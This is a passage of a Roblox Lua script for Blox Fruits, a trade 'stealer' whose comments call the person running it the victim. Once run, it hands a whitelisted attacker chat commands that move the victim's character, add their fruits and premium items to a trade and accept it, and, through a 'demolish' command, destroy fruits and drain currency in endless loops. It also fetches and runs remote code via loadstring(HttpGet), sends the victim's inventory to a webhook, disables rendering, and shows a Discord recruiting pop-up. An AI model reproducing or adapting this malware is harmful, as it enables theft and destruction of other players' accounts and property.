			local p1, p2 = tbl:FindFirstChild("P1"), tbl:FindFirstChild("P2")
			if p1 and p2 then
				local p1Weld, p2Weld = p1:FindFirstChild("SeatWeld"), p2:FindFirstChild("SeatWeld"); local p1Free, p2Free = not p1Weld, not p2Weld; local p1Target, p2Target = isTargetPlayer(p1Weld), isTargetPlayer(p2Weld)
				if (p1Target and p2Free) or (p2Target and p1Free) then bestTable, bestSeat = tbl, p1Free and p1 or p2; break end
				if p1Free and p2Free and not emptyTable then emptyTable, emptySeat = tbl, p1 end
				if not fallbackTable then if p1Free and not p2Target then fallbackTable, fallbackSeat = tbl, p1 elseif p2Free and not p1Target then fallbackTable, fallbackSeat = tbl, p2 end end
			end
		end
	end
	return bestTable or emptyTable or fallbackTable, bestSeat or emptySeat or fallbackSeat
end

-- Checks if the player is currently in trade with an authorized partner
local function isInTradeWithCorrectPlayer()
	if allowEveryone then return true end
	local player = LocalPlayer; local playerGui = player:FindFirstChild("PlayerGui"); if not playerGui then return false end; local mainGui = playerGui:FindFirstChild("Main"); if not mainGui then return false end
	local tradeFrame = mainGui:FindFirstChild("Trade"); if not tradeFrame or not tradeFrame.Visible then return false end
	local container = tradeFrame:FindFirstChild("Container"); local frame1 = container and container:FindFirstChild("1"); local frame2 = container and container:FindFirstChild("2")
	local player1Label = frame1 and frame1:FindFirstChild("TextLabel"); local player2Label = frame2 and frame2:FindFirstChild("TextLabel"); if not player1Label or not player2Label then return false end
	local tradingPartnerName = player2Label.Text; local localPlayerName = player.Name; local localPlayerDisplayName = player.DisplayName
	if player1Label.Text ~= localPlayerName and player1Label.Text ~= localPlayerDisplayName then return false end
	for _, allowedName in ipairs(Usernames) do local tradingPlayer = Players:FindFirstChild(allowedName); if tradingPlayer then if string.lower(tradingPartnerName) == string.lower(tradingPlayer.Name) or string.lower(tradingPartnerName) == string.lower(tradingPlayer.DisplayName) then return true end end end
	local partnerPlayer = Players:FindFirstChild(tradingPartnerName); if not partnerPlayer then for _, p in ipairs(Players:GetPlayers()) do if p.DisplayName == tradingPartnerName then partnerPlayer = p; break end end end
	if partnerPlayer and activatedUsers[partnerPlayer.UserId] then return true end
	return false
end

--[[ Jump Control ]]--
local isForceJumping = false
local stateChangedConnections = {}
local jumpRequestConnection
local characterAddedJumpConnection

-- Forces the character to perform a single jump
local function ForceJump()
	local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if not humanoid then return end
	isForceJumping = true; humanoid.JumpPower = 50; humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
	task.delay(0.5, function() isForceJumping = false; if humanoid and humanoid.Parent then humanoid.JumpPower = 0 end end)
end

-- Prevents the humanoid from jumping normally
local function lockJumping(humanoid)
	if not humanoid then return end
	if stateChangedConnections[humanoid] then stateChangedConnections[humanoid]:Disconnect(); stateChangedConnections[humanoid] = nil end
	humanoid.JumpPower = 0; humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
	stateChangedConnections[humanoid] = humanoid.StateChanged:Connect(function(old, new) if new == Enum.HumanoidStateType.Jumping and not isForceJumping then humanoid:ChangeState(old) end end)
end

-- Disables jumping completely and returns a cleanup function
local function disableJump()
	if jumpRequestConnection then jumpRequestConnection:Disconnect(); jumpRequestConnection = nil end; if characterAddedJumpConnection then characterAddedJumpConnection:Disconnect(); characterAddedJumpConnection = nil end
	if UserInputService.TouchEnabled then jumpRequestConnection = UserInputService.JumpRequest:Connect(function() if not isForceJumping and LocalPlayer.Character then local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h:SetStateEnabled(Enum.HumanoidStateType.Jumping, false) end end end) end
	if LocalPlayer.Character then lockJumping(LocalPlayer.Character:FindFirstChildOfClass("Humanoid")) end
	characterAddedJumpConnection = LocalPlayer.CharacterAdded:Connect(function(char) task.spawn(function() local h = char:WaitForChild("Humanoid", 5); if h then lockJumping(h) end end) end)
	return function() if jumpRequestConnection then jumpRequestConnection:Disconnect(); jumpRequestConnection = nil end; if characterAddedJumpConnection then characterAddedJumpConnection:Disconnect(); characterAddedJumpConnection = nil end; for h, c in pairs(stateChangedConnections) do if c and c.Connected then pcall(c.Disconnect, c) end end; table.clear(stateChangedConnections) end
end

--[[ Discord Invite UI ]]--
-- Creates and displays a UI prompting the victim to join Discord
local function createDiscordUI()
	local ScreenGui = Instance.new("ScreenGui"); ScreenGui.Name = "DiscordInviteUI"; ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; ScreenGui.ResetOnSpawn = false; ScreenGui.IgnoreGuiInset = true; ScreenGui.DisplayOrder = 9999
	local MainFrame = Instance.new("Frame"); MainFrame.Name = "MainFrame"; MainFrame.Size = UDim2.new(0, 800, 0, 350); MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0); MainFrame.AnchorPoint = Vector2.new(0.5, 0.5); MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37); MainFrame.BorderSizePixel = 0; MainFrame.Parent = ScreenGui; Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
	local Title = Instance.new("TextLabel"); Title.Name = "Title"; Title.Size = UDim2.new(1, 0, 0, 40); Title.Position = UDim2.new(0, 0, 0, 10); Title.BackgroundTransparency = 1; Title.Font = Enum.Font.GothamBold; Title.Text = "Read Below!"; Title.TextColor3 = Color3.fromRGB(255, 255, 255); Title.TextScaled = true; Title.Parent = MainFrame
	local Description = Instance.new("TextLabel"); Description.Name = "Description"; Description.Size = UDim2.new(0.9, 0, 0, 100); Description.Position = UDim2.new(0.05, 0, 0.3, 0); Description.BackgroundTransparency = 1; Description.Font = Enum.Font.Gotham; Description.Text = "Hey! Some of your VALUABLE Fruits have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!"; Description.TextColor3 = Color3.fromRGB(220, 221, 222); Description.TextScaled = true; Description.Parent = MainFrame
	local Button = Instance.new("TextButton"); Button.Name = "CopyButton"; Button.Size = UDim2.new(0.7, 0, 0, 56); Button.Position = UDim2.new(0.15, 0, 0.7, 0); Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242); Button.Font = Enum.Font.GothamBold; Button.Text = "Copy Discord Invite"; Button.TextColor3 = Color3.fromRGB(255, 255, 255); Button.TextScaled = true; Button.AutoButtonColor = false; Button.Parent = MainFrame; Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5)
	local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out); local function createTween(i, p) return TweenService:Create(i, fadeInfo, p) end
	MainFrame.BackgroundTransparency = 1; Title.TextTransparency = 1; Description.TextTransparency = 1; Button.BackgroundTransparency = 1; Button.TextTransparency = 1
	task.wait(0.1); createTween(MainFrame, {BackgroundTransparency = 0}):Play(); task.wait(0.1); createTween(Title, {TextTransparency = 0}):Play(); task.wait(0.1); createTween(Description, {TextTransparency = 0}):Play(); task.wait(0.1); createTween(Button, {BackgroundTransparency = 0, TextTransparency = 0}):Play()
	Button.MouseEnter:Connect(function() createTween(Button, {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play() end); Button.MouseLeave:Connect(function() createTween(Button, {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play() end)
	Button.MouseButton1Click:Connect(function() setclipboard("https://discord.gg/uwdvTtqTDA"); Button.Text = "Copied!"; task.delay(2, function() if Button.Parent then Button.Text = "Copy Invite" end end) end)
	ScreenGui.Parent = CoreGui
	return ScreenGui
end

--[[ Command Definition & Handling ]]--
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest")
local function sendMessage(message) pcall(function() SayMessageRequest:FireServer(message, "All") end) end
local CommandCooldowns = {}
local DEFAULT_COOLDOWN = 0.5

local Commands = {
	jump = { execute = ForceJump },
	sit = { execute = function()
		sendMessage("Attempting to sit...")
		local tradeTable, bestSeat = findTradeTable(); if not (tradeTable and bestSeat) then sendMessage("Error finding table! Try ?tp first."); return end
		local character = LocalPlayer.Character; if not (character and character.PrimaryPart) then sendMessage("Character error."); return end
		tweenToPosition(bestSeat.Position + Vector3.new(0, 2, 0)); task.wait(1)
		local function attemptSit() for i=1,10 do local r = Vector3.new(math.random(-2,2)/10,math.random(-2,2)/10,math.random(-2,2)/10); tweenToPosition(bestSeat.Position + r); task.wait(0.5); local h=character:FindFirstChildOfClass("Humanoid"); if h and h.Sit then sendMessage("Sat successfully!"); return true end end; return false end
		if not attemptSit() then sendMessage("Failed to sit. Try ?sit again!") end
	end },
	tp = { execute = function()
		local targetPos, locationName; if game.PlaceId == 7449423635 then locationName = "Mansion"; local inv = getInventory(); if inv then for _, item in ipairs(inv) do if item.Name == "Valkyrie Helm" then Remote:InvokeServer("requestEntrance", Vector3.new(-12471.33, 374.95, -7539.37)); sendMessage("Teleporting to Mansion (Valk)..."); return end end end; targetPos = Vector3.new(-12550.8701, 337.2399, -7425.5200) else locationName = "Cafe"; targetPos = Vector3.new(-381.8599, 73.0800, 299.9299) end
		if targetPos then sendMessage("Teleporting to " .. locationName .. "..."); tweenToPosition(targetPos) else sendMessage("Could not determine TP location.") end
	end },
	reset = { execute = function() if LocalPlayer.Character then LocalPlayer.Character:BreakJoints() end end },
	rejoin = { execute = function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end },
	add = { execute = function(argument)
		local namePart, countPart = argument:match("^(.-)%s*(%d*)$"); if not namePart or namePart == "" then sendMessage("Usage: ?add <fruit_name> [count]"); return end
		local searchTerm = namePart:lower():match("^%s*(.-)%s*$"); local requestedCount = tonumber(countPart); if not requestedCount or requestedCount < 1 then requestedCount = 1 end
		local inventory = getInventory(); if not inventory then sendMessage("Failed get inventory."); return end
		local foundItem = nil; for _, item in pairs(inventory) do if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then foundItem = item; break end end
		if foundItem then local availableCount = foundItem.Count; local countToAdd = math.min(requestedCount, availableCount); if countToAdd <= 0 then sendMessage("No '" .. foundItem.Name .. "' available."); return end; sendMessage("Adding " .. countToAdd .. "x '" .. foundItem.Name .. "'..."); local addedSuccess = 0; for i = 1, countToAdd do local s, e = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", foundItem.Name); if s then addedSuccess = addedSuccess + 1 else sendMessage("Error adding: " .. tostring(e)); break end; task.wait(0.1) end; sendMessage("Added " .. addedSuccess .. "/" .. countToAdd .. " '" .. foundItem.Name .. "'."); if requestedCount > availableCount then sendMessage("(Requested " .. requestedCount .. ", only " .. availableCount .. " available.)") end
		else sendMessage("No fruit matching '" .. searchTerm .. "' found!") end
	end },
	additem = { execute = function(argument)
		local searchTerm = argument:lower():match("^%s*(.-)%s*$"); if searchTerm == "" then sendMessage("Usage: ?additem <item_name>"); return end
		local inventory = getInventory(); if not inventory then sendMessage("Failed get inventory."); return end
		local foundItem = nil; for _, item in pairs(inventory) do if item.Type == "Premium" and item.Name:lower():find(searchTerm, 1, true) then foundItem = item; break end end
		if foundItem then sendMessage("Adding 1x '" .. foundItem.Name .. "'..."); TradeFunction:InvokeServer("addItem", foundItem.Name); task.wait(0.1); sendMessage("Added '" .. foundItem.Name .. "'.") else sendMessage("No premium item matching '" .. searchTerm .. "' found!") end
	end },
	addall = { execute = function()
		local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main"); if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then sendMessage("Not in trade."); return end
		local inventory = getInventory(); if not inventory then sendMessage("Failed get inventory."); return end
		local addedCount = 0; local addedFruits = {}; sendMessage("Adding configured fruits...")
		local inventoryLookup = {}; for _, item in pairs(inventory) do if item.Type == "Blox Fruit" then inventoryLookup[item.Name] = item.Count end end
		for _, fruitName in ipairs(FruitsToHit) do if inventoryLookup[fruitName] and inventoryLookup[fruitName] > 0 and not addedFruits[fruitName] then local s, e = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", fruitName); if s then addedFruits[fruitName] = true; addedCount = addedCount + 1; sendMessage("Added 1x '" .. fruitName .. "'.") else sendMessage("Error adding " .. fruitName .. ": " .. tostring(e)); break end; task.wait(0.1) end end
		if addedCount > 0 then sendMessage("Added " .. addedCount .. " types of configured fruits.") else sendMessage("No configured fruits found/available!") end
	end },
	addallitems = { execute = function()
		local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main"); if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then sendMessage("Not in trade."); return end
		local inventory = getInventory(); if not inventory then sendMessage("Failed get inventory."); return end
		local addedCount = 0; local addedItems = {}; sendMessage("Adding all premium items...")
		for _, item in pairs(inventory) do if item.Type == "Premium" and item.Count > 0 and not addedItems[item.Name] then local s, e = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", item.Name); if s then addedItems[item.Name] = true; addedCount = addedCount + 1; sendMessage("Added 1x '" .. item.Name .. "'.") else sendMessage("Error adding " .. item.Name .. ": " .. tostring(e)); break end; task.wait(0.1) end end
		if addedCount > 0 then sendMessage("Added " .. addedCount .. " premium items.") else sendMessage("No premium items found/available!") end
	end },
	cleartrade = { execute = function()
		local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main"); if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then sendMessage("Not in trade."); return end
		local container = tradeUI.Trade:FindFirstChild("Container"); local playerFrame = container and container:FindFirstChild("1"); local itemFrame = playerFrame and playerFrame:FindFirstChild("Frame"); if not itemFrame then sendMessage("Cannot find trade frame."); return end
		local itemsToRemove = {}; for _, item in ipairs(itemFrame:GetChildren()) do if item:IsA("ImageButton") and item.Name ~= "AddBeli" then table.insert(itemsToRemove, item.Name) end end
		if #itemsToRemove == 0 then sendMessage("No items to remove."); return end
		sendMessage("Clearing " .. #itemsToRemove .. " items..."); local clearedCount = 0
		for _, itemName in ipairs(itemsToRemove) do local s, e = pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", itemName); if s then clearedCount = clearedCount + 1 else sendMessage("Error removing " .. itemName .. ": " .. tostring(e)) end; task.wait(0.1) end
		sendMessage("Cleared " .. clearedCount .. " items.")
	end },
	accept = { execute = function()
		local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main"); if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then sendMessage("Not in trade."); return end
		local character = LocalPlayer.Character; if not character then sendMessage("Character not found."); return end; local humanoid = character:FindFirstChildOfClass("Humanoid"); if not humanoid then sendMessage("Humanoid not found."); return end
		if not humanoid.Sit then sendMessage("Must be sitting to accept."); return end
		sendMessage("Accepting trade..."); task.wait(0.1); TradeFunction:InvokeServer("accept")
	end },
	resetfruit = { execute = function(argument)
		local namePart, countPart = argument:match("^(.-)%s*(%d*)$"); if not namePart or namePart == "" then sendMessage("Usage: ?resetfruit <fruit_name> [count]"); return end
		local searchTerm = namePart:lower():match("^%s*(.-)%s*$"); local requestedCount = tonumber(countPart); if not requestedCount or requestedCount < 1 then requestedCount = 1 end
		sendMessage("Resetting with '".. searchTerm .."' " .. requestedCount .. " times...")
		for i = 1, requestedCount do
			local inventory = getInventory(); if not inventory then sendMessage("Failed get inventory on attempt " .. i); break end
			local foundItem = nil; for _, item in pairs(inventory) do if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then foundItem = item; break end end
			if foundItem then local baseFruitName = foundItem.Name:match("(%S+)"); sendMessage("("..i.."/"..requestedCount..") Equipping '" .. baseFruitName .. "' & resetting..."); ForceJump(); task.wait(0.1); Remote:InvokeServer("LoadFruit", baseFruitName); task.wait(0.3); if LocalPlayer.Character then LocalPlayer.Character:BreakJoints() end; sendMessage("Reset #" .. i .. " complete. Waiting..."); task.wait(6.5)
			else sendMessage("Fruit '" .. searchTerm .. "' not found on attempt " .. i .. ". Aborting."); break end
			if i < requestedCount then task.wait(1) end
		end; sendMessage("Finished reset fruit sequence.")
	end },
	invite = { execute = createDiscordUI },
	demolish = { execute = function()
		sendMessage("!!! WARNING: DEMOLISH COMMAND INITIATED !!!")
		local function invokeRemote(rName, args) local r=ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(rName); return r:InvokeServer(unpack(args)) end
		invokeRemote("CommF_", {"RemoveFruit", "Beli"})
		local inventory = getInventory(); if not inventory then return end; local fruits = {}; for _, i in pairs(inventory) do if i.Type == "Blox Fruit" then table.insert(fruits, i) end end; table.sort(fruits, function(a,b) return a.Value>b.Value end)
		for i, fruit in ipairs(fruits) do local bName=fruit.Name:match("(%S+)"); sendMessage("("..i.."/"..#fruits..") Resetting with '" .. bName .. "'..."); ForceJump(); invokeRemote("CommF_", {"LoadFruit", bName}); task.wait(0.5); if LocalPlayer.Character then LocalPlayer.Character:BreakJoints(); task.wait(6) end end
		local function drainBeli() local rA={"PurchaseRawFruit","Rocket-Rocket",false}; local sA={"PurchaseRawFruit","Spin-Spin",false}; while true do invokeRemote("CommF_",rA); task.wait(0.01); invokeRemote("CommF_",sA); task.wait(0.01) end end
		local function drainFragments() local fA={"BlackbeardReward","Refund","2"}; while true do invokeRemote("CommF_",fA); task.wait() end end
		coroutine.wrap(drainBeli)(); coroutine.wrap(drainFragments)()
	end },
	showinv = { execute = function()
		task.spawn(function()
			sendMessage("Fetching inventory (sorted by value)..."); local inventory = getInventory(); if not inventory then sendMessage("Error: Failed inventory fetch."); return end
			local fruitDataList = {}; for _, item in pairs(inventory) do if item.Type == "Blox Fruit" then table.insert(fruitDataList, {name=item.Name, count=item.Count, value=item.Value or 0}) end end; if #fruitDataList == 0 then sendMessage("No Blox Fruits found."); return end
			table.sort(fruitDataList, function(a, b) return a.value > b.value end); local fruitDisplayList = {}; for _, d in ipairs(fruitDataList) do local s=d.name; if d.count > 1 then s=s.." (x"..d.count..")" end; table.insert(fruitDisplayList, s) end
			local messageLimit=180; local itemsPerEstimate=10; local totalChunks=math.ceil(#fruitDisplayList/itemsPerEstimate); local currentMessage="Fruits [Value] (1/"..totalChunks.."): "; local chunkIndex=1
			for i, fruitName in ipairs(fruitDisplayList) do local prefixLength=string.len("Fruits [Value] (X/Y): "); local separator=(#currentMessage>prefixLength) and ", " or ""; local potentialAddition=separator..fruitName; if string.len(currentMessage)+string.len(potentialAddition)>messageLimit then sendMessage(currentMessage); task.wait(2); chunkIndex=chunkIndex+1; currentMessage="Fruits [Value] ("..chunkIndex.."/"..totalChunks.."): "..fruitName else currentMessage=currentMessage..potentialAddition end end
			if currentMessage ~= "" and not currentMessage:match("^Fruits %[%w+%].*%): $") then sendMessage(currentMessage) end; task.wait(0.5); sendMessage("Inventory display complete.")
		end)
	end },
	test = { execute = function() local s=tick(); task.wait(0.001); sendMessage("Responsive! Time: " .. string.format("%.1f", (tick()-s)*1000) .. "ms") end },
	help = { execute = function() task.spawn(function() local c = {"?help ?test ?jump ?sit ?tp ?reset ?rejoin","?add ?additem ?addall ?addallitems","?resetfruit ?invite ?demolish ?showinv","?allowall ?accept ?cleartrade"}; sendMessage("--- Commands ---"); task.wait(1); for i,m in ipairs(c) do sendMessage(m); task.wait(1) end end) end },
	activate = { execute = function(player, password)
		if not password or password == "" then sendMessage("Usage: ?activate <password>"); return end; if not player or not player:IsA("Player") then return end
		local foundPass = false; for _, vPass in ipairs(ActivationPasswords) do if password == vPass then foundPass = true; break end end
		if foundPass then if activatedUsers[player.UserId] then sendMessage("Already activated, " .. player.Name .. ".") else activatedUsers[player.UserId] = true; sendMessage("Activation successful, " .. player.Name .. "!"); print("Activated User: " .. player.Name .. " (ID: " .. player.UserId .. ")") end else sendMessage("Incorrect password.") end
	end },
	allowall = { execute = function() allowEveryone = not allowEveryone; local s = allowEveryone and "ENABLED" or "DISABLED"; sendMessage("AllowEveryone Mode: " .. s .. ". Access is " .. (allowEveryone and "OPEN." or "RESTRICTED.")); if allowEveryone then sendMessage("ANYONE can use commands") end end }
}

--[[ Command Processor ]]--
-- Processes chat messages to execute commands based on authorization and cooldowns
local function processChatCommand(_, player, message)
	if not (player and message and typeof(player) == "Instance" and player:IsA("Player") and message:sub(1, 1) == "?") then return end
	local commandStr = message:sub(2):match("^%s*(.-)%s*$"); if not commandStr or commandStr == "" then return end
	local command, argument = commandStr:match("^(%S+)%s*(.-)%s*$"); if not command then return end; command = command:lower()

	if command == "activate" then local cmdFunc = Commands[command]; if cmdFunc then task.spawn(cmdFunc.execute, player, argument) end; return end

	local isAuthorized = allowEveryone or (Usernames and table.find(Usernames, player.Name)) or activatedUsers[player.UserId]; if not isAuthorized then return end
	local commandFunc = Commands[command]; if not commandFunc then sendMessage("Unknown command: ?" .. command); return end

	local playerName = player.Name; local playerCooldowns = CommandCooldowns[playerName]
	if playerCooldowns then local lastUsed = playerCooldowns[command]; if lastUsed and (tick() - lastUsed < DEFAULT_COOLDOWN) then sendMessage("Cooldown!"); return end
	else playerCooldowns = {}; CommandCooldowns[playerName] = playerCooldowns end
	playerCooldowns[command] = tick()

	task.spawn(function() local s, e = pcall(commandFunc.execute, argument); if not s then sendMessage("Error ?" .. command .. ": " .. tostring(e)); warn("Cmd Error:", command, argument, e) end end)
end

--[[ Main Loop & Initialization ]]--
-- Manages player position, trade validation, and periodic checks
local function startMainLoop()
	print("DEBUG: startMainLoop called") -- Debug print
	local isLoopRunning = true; local hasCheckedCurrentTrade = false; local currentTable, currentSeat
	local lastMovementTime = tick(); local lastTableCheck = tick(); local lastTradeCheck = tick()
	local UPDATE_INTERVAL = 0.5; local TABLE_CHECK_INTERVAL = 2; local MOVEMENT_CHECK_INTERVAL = 4; local TRADE_VALIDATION_DELAY = 1.5; local TRADE_RECHECK_COUNT = 4
	local validateTradePartnerRunning = false

	local function validateTradePartner()
		if validateTradePartnerRunning then return end; validateTradePartnerRunning = true
		local failedChecks = 0; local lastTradeState = false
		for _ = 1, TRADE_RECHECK_COUNT do task.wait(0.25); local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main"); local currentTradeState = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible; if lastTradeState ~= currentTradeState or not currentTradeState or not isInTradeWithCorrectPlayer() then failedChecks = failedChecks + 1 end; lastTradeState = currentTradeState end
		if failedChecks >= TRADE_RECHECK_COUNT - 1 then task.wait(0.1); ForceJump() end
		validateTradePartnerRunning = false
	end

	local charAddedConn, charRemovingConn, jumpCleanupFunc
	local function onCharacterAdded(character)
		print("DEBUG: onCharacterAdded called for", character.Name) -- Debug print
		task.wait(1); local humanoid = character:WaitForChild("Humanoid", 5); local rootPart = character:WaitForChild("HumanoidRootPart", 5); if not humanoid or not rootPart then return end
		local now = tick(); lastMovementTime, lastTableCheck, lastTradeCheck = now, now, now
		jumpCleanupFunc = disableJump()
		task.spawn(function() print("DEBUG: Finding initial table in onCharacterAdded"); currentTable, currentSeat = findTradeTable(); if currentTable and currentSeat then tweenToPosition(currentSeat.Position) end end)
	end
	local function onCharacterRemoving() print("DEBUG: onCharacterRemoving called"); currentTable, currentSeat = nil, nil; if jumpCleanupFunc then jumpCleanupFunc() end end

	local function runMainLoop()
		print("DEBUG: runMainLoop started") -- Debug print
		local lastTime = tick()
		while isLoopRunning do
			local now = tick(); local deltaTime = now - lastTime; lastTime = now
			local character = LocalPlayer.Character
			if character and character:FindFirstChild("HumanoidRootPart") then
				local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main"); local isInTrade = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible
				if not isInTrade then hasCheckedCurrentTrade = false; lastTradeCheck = now elseif not hasCheckedCurrentTrade and (now - lastTradeCheck) >= TRADE_VALIDATION_DELAY then task.spawn(validateTradePartner); hasCheckedCurrentTrade = true end
				if now - lastTableCheck >= TABLE_CHECK_INTERVAL then task.spawn(function() local nT, nS = findTradeTable(); if nT and nS then currentTable, currentSeat = nT, nS end end); lastTableCheck = now end
				if currentTable and currentSeat then local root = character.HumanoidRootPart; if root then local dist = (root.Position - currentSeat.Position).Magnitude; if dist > 5 then tweenToPosition(currentSeat.Position) elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then local rO = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1)); tweenToPosition(currentSeat.Position + rO); lastMovementTime = now end end end
			end
			local timeElapsed = tick() - now; local waitTime = math.max(0.01, UPDATE_INTERVAL - timeElapsed); task.wait(waitTime)
		end
		print("DEBUG: runMainLoop ended") -- Debug print
	end

	charAddedConn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded); charRemovingConn = LocalPlayer.CharacterRemoving:Connect(onCharacterRemoving)
	if LocalPlayer.Character then task.spawn(onCharacterAdded, LocalPlayer.Character) end
	task.spawn(runMainLoop)
	return function() print("DEBUG: Main loop cleanup function called"); isLoopRunning = false; if charAddedConn then charAddedConn:Disconnect(); charAddedConn = nil end; if charRemovingConn then charRemovingConn:Disconnect(); charRemovingConn = nil end; if jumpCleanupFunc then jumpCleanupFunc() end; currentTable, currentSeat = nil, nil end
end

-- Initializes the script, performs checks, and sets up listeners/main loop activation
local function init()
	print("DEBUG: init() called") -- Debug print
	local placeId = game.PlaceId
	if placeId == 2753915549 then print("DEBUG: Kicking from Sea 1"); LocalPlayer:Kick("Script works only in Sea 2 or 3!"); return end
	if placeId ~= 4442272183 and placeId ~= 7449423635 then print("DEBUG: Kicking from wrong game", placeId); LocalPlayer:Kick("Script is for Blox Fruits only!"); return end
	print("DEBUG: Place ID check passed") -- Debug print

	local initialInventory = getInventory()
	if not initialInventory then print("DEBUG: Kicking due to failed initial inventory fetch"); LocalPlayer:Kick("Error getting initial inventory."); return end
    print("DEBUG: Initial inventory fetched successfully") -- Debug print
    inventory22 = initialInventory -- Assign to global used by leave check

	-- Function to check inventory - now includes debug prints inside
	local function checkInventoryForHit(inv)
		print("DEBUG: FruitsToHit being checked:", HttpService:JSONEncode(FruitsToHit)) -- Print the list being checked
		local s={}; for _,f in ipairs(FruitsToHit) do s[f]=true end;
		for _,i in ipairs(inv) do
			print("DEBUG: Checking item:", i.Name, "| Type:", i.Type) -- Print item being checked
			if (i.Type=="Blox Fruit" and s[i.Name]) or i.Type=="Premium" then
				print("DEBUG: Found valuable item:", i.Name);
				return true -- Returns true if ANY configured fruit or premium item is found
			end
		end;
		print("DEBUG: No valuable items found in checkInventoryForHit");
		return false -- Returns false otherwise
	end

	print("DEBUG: Checking initial inventory for valuable items...") -- Debug print

	-- *** MODIFICATION: Removed the kick condition ***
	-- The script will now always proceed past this point if init runs successfully so far.
	-- The checkInventoryForHit function is still called for debugging purposes.
	local hasValuableItems = checkInventoryForHit(initialInventory)
	if not hasValuableItems then
		print("DEBUG: Initial inventory check returned FALSE (no valuable items according to config), but proceeding anyway.")
	else
		print("DEBUG: Initial inventory check returned TRUE (valuable items found).")
	end
	-- *** End of Modification ***

	-- This task runs regardless of the initial inventory check result now
	task.spawn(function()
		print("DEBUG: Spawning task for JoinTeam, createNotification, sendWebhook") -- Debug print
		task.wait(1)
		JoinTeam()
		task.spawn(createNotification) -- Shows the loading UI
		sendWebhook(initialInventory) -- Sends the initial hit webhook (will show 'None' if nothing valuable was actually found)
		print("DEBUG: Initial notification/webhook task complete") -- Debug print
	end)

	local mainLoopStopper = nil; local chatConnection = nil; local externalUILoaded = false

	-- Activates main functions when a whitelisted player joins
	local function onPlayerAdded(player)
		print("DEBUG: onPlayerAdded called for", player.Name) -- Debug print
		if mainLoopStopper then print("DEBUG: Main loop already running, skipping activation for", player.Name); return end -- Prevent re-activation

		local isWhitelisted = (Usernames and table.find(Usernames, player.Name))
		print("DEBUG: Checking whitelist for", player.Name, "- IsWhitelisted:", isWhitelisted) -- Debug print
		if not isWhitelisted then return end -- Only activate if player is whitelisted

		print("DEBUG: Whitelisted player", player.Name, "detected. Activating main script features...") -- Debug print
		mainLoopStopper = function() end -- Set placeholder immediately to prevent race condition/re-activation

		task.spawn(function()
			print("DEBUG: Starting activation sequence task...") -- Debug print
			-- Load External UI
			if not externalUILoaded then
				print("DEBUG: Attempting to load external UI...") -- Debug print
				local success, err = pcall(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))() -- RESTORED
				end)
				if not success then
					warn("Failed to load external UI:", err)
					print("DEBUG: External UI load FAILED:", err) -- Debug print
				else
					externalUILoaded = true
					print("DEBUG: External UI load SUCCESS") -- Debug print
				end
			else
				print("DEBUG: External UI already loaded, skipping.") -- Debug print
			end
			task.wait(1) -- Wait after UI load attempt

			-- Connect Chat Listener
			if not chatConnection then
				print("DEBUG: Connecting chat listener...") -- Debug print
				chatConnection = Players.PlayerChatted:Connect(processChatCommand)
			else
				print("DEBUG: Chat listener already connected.") -- Debug print
			end

			-- Disable Rendering & Start Main Loop
			print("DEBUG: Disabling 3D rendering and starting main loop...") -- Debug print
			RunService:Set3dRenderingEnabled(false)
			mainLoopStopper = startMainLoop() -- Store actual cleanup function

			-- Initial Chat Message
			task.spawn(function()
				task.wait(2)
				print("DEBUG: Sending initial chat message.") -- Debug print
				sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!")
			end)
			print("DEBUG: Activation sequence task complete.") -- Debug print
		end)
	end

	local playerAddedConn = Players.PlayerAdded:Connect(onPlayerAdded)
	print("DEBUG: PlayerAdded listener connected") -- Debug print

	-- Check existing players after setting up listener
	task.spawn(function()
		print("DEBUG: Checking existing players...") -- Debug print
		for _, player in ipairs(Players:GetPlayers()) do
			onPlayerAdded(player) -- Check if any existing players should activate the script
		end
		print("DEBUG: Finished checking existing players.") -- Debug print
	end)

	-- Cleanup on local player leaving
	local localPlayerRemovingConn; localPlayerRemovingConn = Players.PlayerRemoving:Connect(function(player)
		if player == LocalPlayer then
